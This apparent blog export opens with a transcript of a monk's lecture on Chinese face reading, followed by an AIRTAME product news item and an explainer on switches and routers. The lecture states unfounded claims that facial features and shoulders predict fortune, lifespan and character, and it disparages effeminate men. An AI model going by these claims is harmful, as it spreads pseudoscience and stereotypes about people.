师：你听我说，你们看做官的人，十有九个腮骨是鼓出来的，表明这种人既善于玩权术、驾驭人，还意味着他的晚年无论财富、儿女、事业等都是往上走，而不是向下跌。如果一个人的脸型是尖的、削下来的，就像现在很多明星把脸都削成尖尖的，搞成瓜子脸，如果为了好看削成的尖尖脸，当然不会受影响，也不会影响他老年的运。如果是长成的，到了老年，整个身体、后代、智商、事业等都是往下滑的。若腮骨是炸开的，是由字型脸，这种人越老事业越大。如果是甲字型脸，就像DH，相对讲算是甲字型的脸，这种人是少年得志。由字型脸的人是中年得志，中年有财富，有权力，但是未必出名。这里还有个比例问题，如果上下比较协调，这种人的命运也比较协调、平衡。大家看DH，他的脸是典型的甲字型，和我的脸相比，他的更像甲字。他的甲字是二八分成，上面占了八分，下面占了两分，这种人是典型的有名没有利，就是说他肯定会出名，但做事往往抓不住要害，务虚不务实。这种人不会急功近利，相对来讲，对名看的比较重一点，对利看的比较淡。如果他的甲字是上面小，下面大，他就很看重利，对名则忽略一些。我们看历史上的几个诗人、伟人，名字我想不起来了，他们就是上面太大，大的不成比例，乃至温饱都保障不了。尽管他本人及其文学作品、诗词都很出名，但一日三餐都没保障，就是因为下面太尖，没福。这种人在本行业里稀有难遇，少则为贵，其地位很高、影响力很大，若上下都比较好，脸型像一个用字，这样的人就是又富又贵，不会单一的走向极端的富，或者极端的贵。 问：师父，我曾见过一个比较特殊的面相，就是猪腰子脸，脸是月牙形的。 师：是有一种这样的脸型，上面小，下面也小，中间大，脸呈枣核形，也叫橄榄形。 问：不是您讲的那样。他的眉头和下巴都是突出来的，中间是凹进去的，从侧面看是月牙形。 师：明白了。整个中间凹进去，上边鼓出来，下面也鼓出来。 问：对。我是在南京看到的，我还以为是朱元璋转世。 师：这种情况就像你刚才讲顿翰的下巴，他属于风水回笼，下面是兜上来的。这种人到四十五岁以后才能做点事。 问：DH师在东华寺还不是一样。 师：你说的这种情况比DH师的要严重。你讲的这种人肯定要到四十五岁以后才能够成点事，四十五岁之前，都是碌碌无为，或者说，都是乱逛，混吃混喝。 问：您刚才说，看相分看形、看神和看气。那您看HF师，是神在领导，还是气在领导呢? 师：要看他的神。 问：师父，那明MD呢？ 师：他的地格比较兜，也算是晚景好，这要看他的神。 问：师父，历史上的朱元璋是不是这样呢？ 师：朱元璋的脸非常长，但下巴是兜的。看人的神韵是比较难的，必须有很丰富的经验才能够看神，因为神很细、藏的比较深，看神同时必须兼顾看气，看这个人的面相、五官和肤色是否纯净。看神也要从两方面看，一是近看，近看一个人时，要看他的状态是不是像睡觉一样处在混沌状态，即恍兮惚兮的状态；二是动看，看一个人动的时候，是不是像猛虎下山、游龙出海。如果一个人，近看他的时候，处于恍兮惚兮，仿佛要睡觉的样子；动的时候像火山爆发一样，这时就要看他的气和神，否则，睡觉时好像没睡着，动的时候又像没睡醒，这种人很难成事。如果动的时候犹如火山爆发、蛟龙出海；静的时候（注意不是睡觉的时候）处于混沌、恍恍惚惚的状态，说他睡觉打瞌睡，他也没实睡，说他很清醒，又好像坐在那儿在打盹，其实又没打盹，这时就要把神和气结合起来看。同时，还要听声音，如果一个人的声音浑厚，有穿透力、震动力，即使他的五官不好，他也一定有七到八年的好运。如果一个人的五官很好，气色也好，但他的声音很短，没有后劲，没有穿透力，别说他的事业做不起来，就是做起来了，刹那间也会跌下去，因为这种人的力气、心力跟不上，不可能有一番卓越的事业，即使做起来了，也不可能持久。 问：师父，现在有些人长的不怎么样，就去整容。这样对他的命运或者财运，是不是都有影响？ 师：应该是有一点点帮助。 问：比如把断鼻子隆起来？ 师：有一点点帮助。 问：但根本不解决问题? 师：现在的人都喜欢美。比如找异性朋友，不管这个人有没有才华，品德好不好，先看他长的好不好，所以美貌容易骗人，但只能骗得了一时，骗不了长久。通过做手术做成一个样子，但内在没有那股气，两人一旦一起生活、或工作，他没有那股气，就做不出那样的事，对方就没有那种感觉，就像炒菜没放油、开车没劲一样，几年后依然会分手，不能长相守。 问：山寨版啊？ 师：是山寨版。 问：师父，胸口有痣怎么讲？ 师：胸口有痣，刚才讲了，这种人比较有智慧、有理想，而且比较有人缘，有善缘，有人帮助他。过去有句话，背后有痣我背猴；胸前有痣侯背我（侯爷重用我）。所以前面有痣，相对比较好。 问：师父，有红痣呢？痣长在边上呢？ 师: 一样，都意味着辛苦操劳奔波。有红痣的人感情比较丰富、细腻、沉稳；黑痣代表一个人的生命力比较旺盛，或者说比较冲动，因为生命力旺盛、精力旺盛就容易冲动。 问：师父，眉毛长的很长代表秀吗？ 师：这要看从什么年龄开始的。比如长寿眉，是从五十岁以后开始长长的，这意味着长寿。若三十岁就开始长长寿眉，意味着肾的阳气提早释放了，反而不长寿。 问：那四十岁呢？ 师：四十岁也有点早，长寿眉不应该四十岁开始长，五十岁开始长是最好的，这就像点油灯，早点油灯，早熄灭。所以，五十岁以后长长寿眉意味着长寿，三十岁长长寿眉反而意味着短命，因肾的阳气提早释放光了。 问：师父，如果把不好的痣去掉，可不可以改变风水？ 师：刚才说过这个话题了，难道没听懂吗？去掉不好的痣与通过整容改变面相，道理都是一样的。去掉痣，虽然表面没有了，内在的气还在，给人的第一感觉很好，但一打交道，一共事，在一起一生活，就发现不对味了。 问：师父，我见过一个人，有三、五根眉毛根特别长，有半米。 师：那是奇人异士。 问：我想起肩膀，有的人的肩膀就像钟馗一样。 师：是抬起来的。 问：有的人肩膀向下塌，是人字型的。 师：所以叫你们问，否则我都想不起来了。塌肩膀——垂肩膀的人，千万不要与之共事，这种人不负责任，再大的担子交给他，他膀子晃一晃，就扔掉不管了。 问：是因为他担不起来吗？ 师：不是他担不起来，是他根本就不担，不想担，不负责任。 问：是他没那个能力，还是？ 师：有能力，但他根本不想担。如果肩膀是平的人，就是负责任的人，你尽管把终生托付给他，他一定能承担责任。如果肩膀耸着，就像缩着脖子，这是没有放松，肯定是短命之相，因为没放松，中间的气是吊起来的，长期悬着，生命就不会长久。这种人也胆小怕事。肩膀过于下垂是因为气沉下来了，这种人的确会长寿，但一辈子挑不起一件事，做任何事都是有头无尾，三分钟热度。这种人做任何事情，刚开始跟你讲时，让你听上去会觉得终于有了希望，终于找到了大道，终于找到了依靠，好的不得了，可是过后他从来不给你兑现。 问：没后劲？ 师：因为他的肩膀就是塌的。 问：虚云老和尚的肩膀也是塌的。 师：他那个年龄就要另当别论了，我相信他年轻时绝对不是这种相。你看的那张相片，是他一百二十岁时照的，所以脖子向前探，肩膀往外垂，那是他一百二十岁的相，六十岁之前，他肯定不是这种相。人过了六十岁，气往下走，肩膀就往下垂，脖子往上伸，这是正常现象。如果一个四、五十岁的人，脖子往上探，肩膀往下垂，则是反常之相，要以年龄来论。 问：师父，刚才提到肩膀，我想到有些人是罗圈腿，走路时胳膊向两边横着架起来。 师：是有这种人。你们想一想，这样走路是什么感觉？是不是咋咋呼呼的，好像在说闪开啊、闪开，看我的，我来啦！这种人就是半吊子、二百五，做事从来不考虑旁边人的感受，就喜欢大大咧咧走路的感觉。 这种人的气从来不内敛，任何时候都是张开的，而且这种人一身”刺儿”。一个人的气要平，就要保持关闭状态，用时瞬间能打开，能开、关适时，进、退有度，没事时就像个聋子、瞎子。我们出家人，没事时像聋子、瞎子的特别多，但是有事时像蛟龙、如猛虎的却少之又少，所以我说，谁都可以依靠，千万不能依靠出家人，出家人是最不可信，最靠不住的。只能与之说说话，聊聊天，倾诉一下，不能托付给他任何一件，因为出家人学的所有功法都讲收敛、退让。再者，很多出家人都是邪道邪见，应该具备的另一面力量没有学到，本来出家人应该勇于承担责任、善于包容，放下我的，挑起他人的，但是很多出家人没有学会调动这种力量，只学会了看开、放下，退让，所以都是松松的、颠颠的，真正需要他出手时，不能像蛟龙猛虎，这就是学偏了。真把佛陀的教育学好了，就能开关自如，张弛有度，进退适时。现在我们出家人，整个都是收敛的，没有张就无法前进。 问：师父，胡须呢？ 师：刚才说了，少看两道眉，临老一付须。 问：嘴巴上面有痣呢？ 师：嘴巴上，就是刚才讲的船上面嘛。如果船上面长痣，代表财富进不来；如果下嘴唇上长痣，注意不是长在下巴上，而是长在下嘴唇旁，下嘴唇代表船帮，意味着船底打了个洞，就进水、漏掉了。 问：师父，你说整容不管用，那破相呢？ 师：破相也有影响。 问：如果牙齿露缝代表什么呢? 师：这种人爱说他人是非，不能保守他人秘密。 问：这样露财吗？ 师：露财。爱说是非，惹是生非不就露财了嘛。 问：（录音不清）…… 师：如果鼻根塌，只能说在四十一岁到四十三岁这三年中精力不够充沛，感觉上气接不住下气，但这不代表晚年身体不健康，不代表不长寿。眉毛的后半部代表晚年、代表后劲，前半部代表四十岁之前，要这样去看。 问：师父，HZ的气色很好。一个人的面相会不会变？ 师：会变，绝对会变。一个人的五官、面相绝对是七年一变。一个人的气，即气色，一个星期一变。五官、皮肤的纹路，包括手纹都是七年一变。而一个人的神韵是七分钟一变。如果你们想了解什么叫清透，可以看HZ，她的肤色就代表了清透——又清又透像块玉。男的可以看MD，他的肤色也代表了清透。肤色清透的人，即使五官没一个长的好，也必有十年大运。如果五官好，但气色不好，就像CF，我们整个寺庙五官长得最好的就是CF——比较匀称、协调，但他脸上有一层锈，就像一个金刚罩或一层纱窗把他给套住了，他一旦被这种能量场套住，整个思维都会错乱，如果他的心量能够捅破这个金刚罩、这个纱罩，他就冲出去了，他的整个思维就会随之而改变。否则，他就一直被这个罩子罩着，他的整个思维就在这个范围内，怎么挣扎都跳出不去。所以说，五官好不如气好，气好不如神好。 问：师父，有的人端肩膀，缩脖子。 师：那不是好相。 问：师父，怎样才能去掉那个金刚罩呢？ 师：这与他的思想和心态有绝对关系。 问：要励志吗？ 师：如果大家不信，可以和这种人深交一下，他的整个为人处世的观点跟我们截然不同。 问：能气死人? 师：能把人气死，他为人处世的观点都是反着的。比如我们说”吃亏是福”，他可能会认为，”吃亏才不是福，吃亏是蠢猪”；如果我们说吃亏是蠢猪，他就会说吃亏不是蠢猪，吃亏是福，他的整个思维与常人是反的。 问：师父，人的身心是一体的，但有时思想走偏了会怎样？ 师：身心包括气和神，只有达到统一、完整，才能产生巨大的爆发力。如果身和心、气与神都分离了，变成了几股力量，那么做任何事情都无法达成。 师：今晚为何把HY和MD叫上来？因为他们两个的眼神都是游离的，都转得太快。HY和MD是我们东华寺最聪明、反应最快的人，而这恰恰又是他们俩个最大的破败之相。请问大家，如果跟他俩打交道，向他们托付终生，会不会觉得没有安全感？因为他们两个太聪明了，眼睛都是游离的，梭梭的左右转，因此就不是他们的优点了，而成为了缺点，如果托付给DH，绝不会像他俩那样，让人感到会被耍、被骗，DH会踏踏实实的。 问：聪明过头了？ 师：对。他们两个的速度太快，整个神韵变化得太快。 问：那就慢一点? 师：对。 问：师父，通过观香能不能变得慢一点？ 师：观香可以。好在他们俩现在还年轻，如果到了三、四十岁还不改变，恐怕就很难改变了。 问：自从您跟我说了之后，平常与人交流时，我已经开始注意了。 师：我看到了。 问：我试着和人交流时直视对方。 师：对对对。 问：我会尽量盯着对方的脸，比如眉毛，或者脸上的痣，我对着眉毛或者那颗痣说话，可有时真的是习惯使然，一不留神，眼神就跑掉了，必须通过刻意的训练。 师：对，要通过刻意的训练。 问：可以弥补？ 师：对。不管男女，眼神都不能左右游离。如果跟别人说话，就要正面看着对方，比如看他的嘴、鼻子，或者衣扣等，眼睛不能在对方身上像扫描一样，看来看去，否则对方会怀疑你是不是心怀鬼胎，或者要耍流氓。与人交流时盯着对方看就行了，或者不盯着对方，而是看星星，或者看房子，代表也在听对方讲话，但眼睛不能转得太快。就是说，宁可眼睛看起来显得木讷呆滞，也不能让眼睛游离不定。 问：师父，这个跟自己的思想有关系吗？ 师：是内在的心气不定。 问：师父，刚才谈到男人女相，我看到有些男人走路、说话就像女人。 师：我知道你是在说我们东华寺的MD。大家看MD，他的内在非常秀，他画的人物像、美女、牡丹真是好，你都不敢相信是他画的，他内在的两股力量都在用。这种人在思想上、智慧上，或者知识上涉猎的比较广，遇到打架斗殴时，可能会感到他的阳刚之气不足，这种人本来就不是玩阳刚之气的，他是玩阴柔之气的，属于阴柔至美型，比如搞艺术、文学或者给人出谋划策，都很擅长。这种人不直接跟人打交道，如果能到达很高的位置，并由他来布局时，他会发挥的非常好。如果给他一片天地，让他说了算，他会把男人的阳性力量和女人的阴性力量淋漓尽致地发挥出来，若寄人之下，他的特长就发挥不了了。 问：我曾经碰到过一个小伙子，一米八高，长得非常好，喜欢用女人的化妆品，看起来是女人的形象，走路也是女人的形态，说话的语调语气也像女人，只是他的声音很浑厚，但你根本听不出他是男的。 师：女人男相，说的是女人可以有男人的相，但不能有男人的身，也不能有男人的声音。如果女人有男人的声音，这是破败之相。女人可以有男人的形状，但她的声音必须要是女性的清脆之音，这才是富贵之相。 问：抬头纹生的太早，三十几岁就有抬头纹了? 师：这意味着少年不得志，少年时愁心的事比较多，也意味着他的家庭出身在当地属于比较底层的。过了四十岁，如果额头上有三条竖纹，即川字纹，就代表长寿与智慧；如果是雁字纹，就代表愁事于心；如果眉间整天锁着，好像从来没有舒展开，喜欢皱眉头的人，代表他的心气、心量都是锁着的，没有打开。 问：师父，刚才说到男人女人相，或者女人男人相。有些男人长的并不像女人，但走路，生活习惯，还有手势都像女人，比如手指头还勾着，看起来特别恶心。这是不是一种破相呢？ 师：也算是破相。 问：人妖呢？ 师：人妖则另当别论。确实有这样的男人，动作特别像女人，尤其是手指头喜欢勾着，这也是破败之相。所谓男人带女相，只是在五官上有点像女人，像老太太，但这也有年龄限制，只限于五十岁之后的男人，是这么看的。 问：师父，有的人上身特别长？ 师：是有这样的人，就是上身长，下身短。俗话说，上身长，下身短，不是好吃就是懒。但不是绝对的，你们可别对号入座。只是说有这样的倾向。为什么呢？上身长下身短的人，不好动，喜欢坐在一个地方，爱考虑问题，这种人往往是吃思想饭。大家要知道，中国的道学、玄学、相学产生于古代农业社会，不像现在的电脑、高科技时代，农耕时代靠体力吃饭，如果上身长下身短的人只坐在那里考虑问题，不出去劳动，就会被说成好吃懒做。现代社会已经不靠体力，而是靠脑力、靠手吃饭，就不能这么武断的评论了。但有一点是肯定的，脑袋大、身体小的人，一定是靠头脑吃饭的，因为他整天考虑问题，把气都调上来了，气没有沉下去，脑袋就大了。如果脑袋小，手粗腿粗整个身体都粗，就是所谓的四肢发达头脑简单之人，肯定是吃体力饭，而不是吃脑力饭的。 问：如果腿很细呢？ 师：腿很细，也是吃头脑饭的。 问：头重脚轻？ 师：对，头重脚轻是靠头脑吃饭的。凡是玩智力的人都是脑袋大，腿比较细；凡是吃体力饭的人，都是腿粗，脑袋相对比较小一点。 问：师父，想请你讲一下牙齿，很多人的牙齿是上牙包着下牙。 师：哦。天包地、地包天的问题。 问：这个该怎么讲？ 师：地包天代表后代。地包天的人，其儿女通常相对比较有出息、孝顺。比如读书比较让父母省心，考大学也不用父母花钱，自己拿到奖学金；成家立业也不让父母操心。如果是天包地，说明此人的个人能力比较强。天包地，代表主动；地包天，代表被动。天包地的人太主动，把后代的福都吃了；地包天的人比较被动，其后代就比较好，太被动了就把福报都留给儿孙了，就是主动和被动的含义。 问：我的地格包在上面了？ 师：那好啊，将来多收几个徒弟，有出息啊。 师：驼背，一个人如果先天后背就是鼓鼓的像个罗锅，但不是有病，这种人在他的行业里不当王也是侯。现今有个军区司令员就是这样，十五年前，那时他还是正师级，我就说他能做一方诸侯，做统领三军的司令员，当时他还不相信，这么多年果然一步步验证了我的话。他后背就是鼓的，但不是腰驼，是龟背，而且是龟胸——胸是平的，没有胸肌。 问：还不是罗锅，对吗？ 师：不是罗锅，只是有一点点那个味道。 问：如果是罗锅就不行了吧？ 师：罗锅是一种病态。我说的背后鼓就像乌龟的背。 问：MH师的背算什么？ 师：他那个还不算龟背。 问：ZH是什么相，他的鼻子很特别？ 师：他的鼻子很特别，比较直、挺。相对来讲，如果看他的五官，第一印象最容易记住的是他的鼻子，他的鼻子相对比较好，代表他的肺活量很好，也意味着他做事果断，不会吞吞吐吐、扭扭捏捏，行就行，不行就不行。如果他觉得不行，再劝他也没用；如果他觉得行，再阻挠他也没用。他是直筒子，气来的快，去的也快，很果断。 今天这堂课主要在讲形，以后有机会我再单独论述一下气和神。最后，我再告诉大家一个秘诀，千古不传的秘密，这是能一锤子定音的。男人要这样看：男人的眉骨或者眉毛，代表两个手臂；鼻梁代表胸膛，代表脊柱；法令线代表两个大腿；鼻子代表生殖器；印堂代表头脑聪不聪明，睿不睿智，就是要看额头这一带是否饱满光泽，有没有破坏。女人则恰恰颠倒过来了。女人的嘴巴代表头脑；法令线代表手臂；眉毛或者眉骨代表腿；印堂就不用说了；鼻梁代表整个胸膛和脊柱。只要按这个方法去看，去分析，千分之一千二的准确，丝毫不差。过去师父教看相，什么都教完了，就是不讲这个图。今天我跟大家说了。好，今天就到这里。以后找机会再讲气和形。 释万行2013.01.11","categories":[{"name":"笑看人生","slug":"笑看人生","permalink":"http://demonelf.github.io/categories/笑看人生/"},{"name":"EMBEDDED","slug":"笑看人生/EMBEDDED","permalink":"http://demonelf.github.io/categories/笑看人生/EMBEDDED/"}],"tags":[]},{"title":"[单曲] unknown - You☆~想念式の循环~让你痴痴入迷","slug":"EMBEDDED/[单曲] unknown - You☆~想念式の循环~让你痴痴入迷","date":"2016-07-02T09:16:03.000Z","updated":"2017-07-10T08:46:32.815Z","comments":true,"path":"EMBEDDED/[单曲] unknown - You☆~想念式の循环~让你痴痴入迷.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/[单曲] unknown - You☆~想念式の循环~让你痴痴入迷.html","excerpt":"[audio mp3=”http://www.madhex.com/wp-content/uploads/2016/07/724c2F06742F974e2Fe5717cb2f71fb7942c4f1cc27a2203ea.mp3\"][/audio]","text":"[audio mp3=”http://www.madhex.com/wp-content/uploads/2016/07/724c2F06742F974e2Fe5717cb2f71fb7942c4f1cc27a2203ea.mp3&quot;][/audio]","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"这小玩意儿太有用了 无线HDMI告别繁琐数据线","slug":"EMBEDDED/这小玩意儿太有用了 无线HDMI告别繁琐数据线","date":"2016-07-01T02:16:49.000Z","updated":"2017-07-10T08:47:51.342Z","comments":true,"path":"EMBEDDED/这小玩意儿太有用了 无线HDMI告别繁琐数据线.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/这小玩意儿太有用了 无线HDMI告别繁琐数据线.html","excerpt":"腾讯数码讯（编译：闻尚雨）说到HDMI线大伙儿一定不陌生，基本有一些硬件常识的人都知道HDMI线的作用，它用于传输高清多媒体数据，且画面和声音通过一根线即可同时传输到位。不过，随着科技的进步，大家可不喜欢看到到处都布满了数据线，因而诞生了许多无线产品。近日","text":"腾讯数码讯（编译：闻尚雨）说到HDMI线大伙儿一定不陌生，基本有一些硬件常识的人都知道HDMI线的作用，它用于传输高清多媒体数据，且画面和声音通过一根线即可同时传输到位。不过，随着科技的进步，大家可不喜欢看到到处都布满了数据线，因而诞生了许多无线产品。近日，我们发现HDMI都有无线产品了，它名叫AIRTAME。是不是觉得产品设计很酷？事实证明它确实得到了很大的认可，因为该公司被官方授予CES2014最佳创业公司。 有了AIRTAME，无论你是MAC、Win、Lin、iOS、Android还是WP系统，设备的屏幕和声音都可以无线传输到电视、投影仪或者其他显示器上。当然，也可以用于扩展屏幕，简直是演讲和分享的最佳利器。 使用AIRTAME的方法异常简单，例如要将A设备上的画面和声音复制到B设备上，或者扩展A设备的屏幕，步骤如下： 1.将AIRTAME插入B设备，使用产品套装里的USB数据线给AIRTAME供电。 2.在A设备上安装AIRTAME软件即可。 3.在A设备的软件里下拉菜单，选择需要将数据传输过去的设备（每个插了AIRTAME的设备均会显示出来，这里选择自己需要的那个即可）。 4.通过已有的网络或者热点即可传送A设备上的数据，一切大功告成。 目前，AIRTAME正在Indiegogo上募资，它设定的目标资金为16万美元，但是小小的它已经募得了将近135万的资金，足以证明有多少人需要这样的设备。据悉，单个AIRTAME的支持售价为134美元（约合人民币820元），购买多个会有一些优惠价格，详情请关注产品的Indiegogo页面，产品预计将于2015年1月出货，喜欢的朋友不要错过。 来源：indiegogo","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"二层交换机、三层交换机和路由器的基本工作原理和三者之间的主要区别","slug":"EMBEDDED/二层交换机、三层交换机和路由器的基本工作原理和三者之间的主要区别","date":"2016-06-30T01:35:47.000Z","updated":"2017-07-10T08:46:07.121Z","comments":true,"path":"EMBEDDED/二层交换机、三层交换机和路由器的基本工作原理和三者之间的主要区别.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/二层交换机、三层交换机和路由器的基本工作原理和三者之间的主要区别.html","excerpt":"二层交换机： 1. CAM表[端口MAC] 2. 自身没MAC/IP 三层交换机： 1. CAM表[MACVLAN] 2. 路由表[IPMAC] 3. 自身有MAC/IP 4. 一个MAC/IP对应多个端口一个","text":"二层交换机： 1. CAM表[端口&lt;-&gt;MAC] 2. 自身没MAC/IP 三层交换机： 1. CAM表[MAC&lt;-&gt;VLAN] 2. 路由表[IP&lt;-&gt;MAC] 3. 自身有MAC/IP 4. 一个MAC/IP对应多个端口一个VLAN(多个端口通过桥接后就为VLAN三层口) 三层路由器： 1. 路由表[IP&lt;-&gt;MAC] 2. CAM表[端口&lt;-&gt;MAC] 3. 自身有MAC/IP 4. 一个MAC对应一个端口 二层交换机: 二层交换技术是发展比较成熟，二层交换机属数据链路层设备，可以识别数据包中的MAC地址信息，根据MAC地址进行转发，并将这些MAC地址与对应的端口记录在自己内部的一个地址表中。具体如下： （1）当交换机从某个端口收到一个数据包，它先读取包头中的源MAC地址，这样它就知道源MAC地址的机器是连在哪个端口上； （2）再去读取包头中的目的MAC地址，并在地址表中查找相应的端口； （3）如表中有与这目的MAC地址对应的端口，把数据包直接复制到这端口上。 三层交换机: 三层交换技术就是将路由技术与交换技术合二为一的技术。在对第一个数据流进行路由后，它将会产生一个MAC地址与IP地址的映射表，当同样的数据流再次通过时，将根据此表直接从二层通过而不是再次路由，从而消除了路由器进行路由选择而造成网络的延迟，提高了数据包转发的效率。 路由器 ： 传统地，路由器工作于OSI七层协议中的第三层，其主要任务是接收来自一个网络接口的数据包，根据其中所含的目的地址，决定转发到下一个目的地址。因此，路由器首先得在转发路由表中查找它的目的地址，若找到了目的地址，就在数据包的帧格前添加下一个MAC地址，同时IP数据包头的TTL（Time To Live）域也开始减数，并重新计算校验和。当数据包被送到输出端口时，它需要按顺序等待，以便被传送到输出链路上。路由器在工作时能够按照某种路由通信协议查找设备中的路由表。如果到某一特定节点有一条以上的路径，则基本预先确定的路由准则是选择最优（或最经济）的传输路径。由于各种网络段和其相互连接情况可能会因环境变化而变化，因此路由情况的信息一般也按所使用的路由信息协议的规定而定时更新。 主要区别：二层交换机工作在数据链路层，三层交换机工作在网络层，路由器工作在网络层。 具体区别如下 二层交换机和三层交换机的区别： 三层交换机使用了三层交换技术，简单地说，三层交换技术就是：二层交换技术＋三层转发技术。它解决了局域网中网段划分之后，网段中子网必须依赖路由器进行管理的局面，解决了传统路由器低速、复杂所造成的网络瓶颈问题。 三层交换（也称多层交换技术，或IP交换技术）是相对于传统交换概念而提出的。众所周知，传统的交换技术是在OSI网络标准模型中的第二层——数据链路层进行*作的，而三层交换技术是在网络模型中的第三层实现了数据包的高速转发。简单地说，三层交换技术就是：二层交换技术＋三层转发技术。 三层交换技术的出现，解决了局域网中网段划分之后，网段中子网必须依赖路由器进行管理的局面，解决了传统路由器低速、复杂所造成的网络瓶颈问题。 其原理是： 假设两个使用IP协议的站点A、B通过第三层交换机进行通信，A把自己的IP 地址与B的IP 地址比较，采用其软件中配置的子网掩码提取出网络地址来确定B是否与自己在同一子网内。 若B 与A 在同一子网内，A 广播一个ARP 请求，B 返回其MAC 地址，A 得到B 的MAC 地址后将这一地址缓存起来，并用此MAC 地址封包转发数据，第二层交换模块查找MAC 地址表确定将数据包发向目的端口。 (下面描述有问题-此次arp是要找到网关mac并非B的mac) 若B 与A不在同一子网内，如发送站A要与目的站B通信，发送站A要向”缺省网关”发出ARP(地址解析)封包，而”缺省网关”的IP地址其实是三层交换机的三层交换模块。当发送站A对”缺省网关”的IP地址广播出一个ARP请求时，如果三层交换模块在以前的通信过程中已经知道B站的MAC地址，则向发送站A回复B的MAC地址。否则三层交换模块根据路由信息向B站广播一个ARP请求，B站得到此ARP请求后向三层交换模块回复其MAC地址，三层交换模块保存此地址并回复给发送站A,同时将B站的MAC地址发送到二层交换引擎的MAC地址表中。从这以后，当A向B发送的数据包便全部交给二层交换处理，信息得以高速交换。由于仅仅在路由过程中才需要三层处理，绝大部分数据都通过二层交换转发，因此三层交换机的速度很快，接近二层交换机的速度，同时比相同路由器的价格低很多。 华为公司三层以太网交换机基本原理及转发流程：http://wenku.baidu.com/view/70f5b9360b4c2e3f572763ef.html 三层交换机的工作原理：http://wenku.baidu.com/view/be70ca54f01dc281e53af0aa.html?from=search) 第二层交换机和路由器的区别： 传统交换机从网桥发展而来，属于OSI第二层即数据链路层设备。它根据MAC地址寻址，通过站表选择路由，站表的建立和维护由交换机自动进行。路由器属于OSI第三层即网络层设备，它根据IP地址进行寻址，通过路由表路由协议产生。交换机最大的好处是快速，由于交换机只须识别帧中MAC地址，直接根据MAC地址产生选择转发端口算法简单，便于ASIC实现，因此转发速度极高。但交换机的工作机制也带来一些问题。 1.回路：根据交换机地址学习和站表建立算法，交换机之间不允许存在回路。一旦存在回路，必须启动生成树算法，阻塞掉产生回路的端口。而路由器的路由协议没有这个问题，路由器之间可以有多条通路来平衡负载，提高可靠性。 2.负载集中：交换机之间只能有一条通路，使得信息集中在一条通信链路上，不能进行动态分配，以平衡负载。而路由器的路由协议算法可以避免这一点，OSPF路由协议算法不但能产生多条路由，而且能为不同的网络应用选择各自不同的最佳路由。 3.广播控制：交换机只能缩小冲突域，而不能缩小广播域。整个交换式网络就是一个大的广播域，广播报文散到整个交换式网络。而路由器可以隔离广播域，广播报文不能通过路由器继续进行广播。 4.子网划分：交换机只能识别MAC地址。MAC地址是物理地址，而且采用平坦的地址结构，因此不能根据MAC地址来划分子网。而路由器识别IP地址，IP地址由网络管理员分配，是逻辑地址且IP地址具有层次结构，被划分成网络号和主机号，可以非常方便地用于划分子网，路由器的主要功能就是用于连接不同的网络。 5.保密问题：虽说交换机也可以根据帧的源MAC地址、目的MAC地址和其他帧中内容对帧实施过滤，但路由器根据报文的源IP地址、目的IP地址、TCP端口地址等内容对报文实施过滤，更加直观方便。 6.介质相关：交换机作为桥接设备也能完成不同链路层和物理层之间的转换，但这种转换过程比较复杂，不适合ASIC实现，势必降低交换机的转发速度。因此目前交换机主要完成相同或相似物理介质和链路协议的网络互连，而不会用来在物理介质和链路层协议相差甚元的网络之间进行互连。而路由器则不同，它主要用于不同网络之间互连，因此能连接不同物理介质、链路层协议和网络层协议的网络。路由器在功能上虽然占据了优势，但价格昂贵，报文转发速度低。近几年，交换机为提高性能做了许多改进，其中最突出的改进是虚拟网络和三层交换。 划分子网可以缩小广播域，减少广播风暴对网络的影响。路由器每一接口连接一个子网，广播报文不能经过路由器广播出去，连接在路由器不同接口的子网属于不同子网，子网范围由路由器物理划分。对交换机而言，每一个端口对应一个网段，由于子网由若干网段构成，通过对交换机端口的组合，可以逻辑划分子网。广播报文只能在子网内广播，不能扩散到别的子网内，通过合理划分逻辑子网，达到控制广播的目的。由于逻辑子网由交换机端口任意组合，没有物理上的相关性，因此称为虚拟子网，或叫虚拟网。虚拟网技术不用路由器就解决了广播报文的隔离问题，且虚拟网内网段与其物理位置无关，即相邻网段可以属于不同虚拟网，而相隔甚远的两个网段可能属于不同虚拟网，而相隔甚远的两个网段可能属于同一个虚拟网。不同虚拟网内的终端之间不能相互通信，增强了对网络内数据的访问控制。 第三层交换机和路由器的区别： 在第三层交换技术出现之前，几乎没有必要将路由功能器件和路由器区别开来，他们完全是相同的：提供路由功能正在路由器的工作，然而，现在第三层交换机完全能够执行传统路由器的大多数功能。作为网络互连的设备，第三层交换机具有以下特征： 1.转发基于第三层地址的业务流； 2.完全交换功能； 3.可以完成特殊服务，如报文过滤或认证； 4.执行或不执行路由处理。 第三层交换机与传统路由器相比有如下优点： 1.子网间传输带宽可任意分配：传统路由器每个接口连接一个子网，子网通过路由器进行传输的速率被接口的带宽所限制。而三层交换机则不同，它可以把多个端口定义成一个虚拟网，把多个端口组成的虚拟网作为虚拟网接口，该虚拟网内信息可通过组成虚拟网的端口送给三层交换机，由于端口数可任意指定，子网间传输带宽没有限制。 2.合理配置信息资源：由于访问子网内资源速率和访问全局网中资源速率没有区别，子网设置单独服务器的意义不大，通过在全局网中设置服务器群不仅节省费用，更可以合理配置信息资源。 3.降低成本：通常的网络设计用交换机构成子网，用路由器进行子网间互连。目前采用三层交换机进行网络设计，既可以进行任意虚拟子网划分，又可以通过交换机三层路由功能完成子网间通信，为此节省了价格昂贵的路由器。 4.交换机之间连接灵活：作为交换机，它们之间不允许存在回路，作为路由器，又可有多条通路来提高可靠性、平衡负载。三层交换机用生成树算法阻塞造成回路的端口，但进行路由选择时，依然把阻塞掉的通路作为可选路径参与路由选择。 交换机和路由器是性能和功能的矛盾体，交换机交换速度快，但控制功能弱，路由器控制性能强，但报文转发速度慢。解决这个矛盾的最新技术是三层交换，既有交换机线速转发报文能力，又有路由器良好的控制功能。 